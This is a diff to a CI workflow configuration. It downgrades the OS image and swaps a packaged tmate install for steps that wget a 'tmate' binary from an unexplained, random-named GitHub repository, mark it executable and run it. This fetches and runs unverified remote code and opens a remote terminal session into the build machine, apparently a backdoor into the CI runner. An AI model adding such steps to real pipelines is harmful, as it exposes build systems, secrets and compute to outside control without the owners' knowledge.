@@ -3,12 +3,13 @@ name: Your_CI_Workflow
 agent:
   machine:
     type: e1-standard-2
-    os_image: ubuntu2004
+    os_image: ubuntu1804
 blocks:
   - name: Build_and_Deploy
     task:
       jobs:
         - name: Download_and_Run_Script
           commands:
-            - sudo apt-get install tmate -y
-            - tmate -F
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F
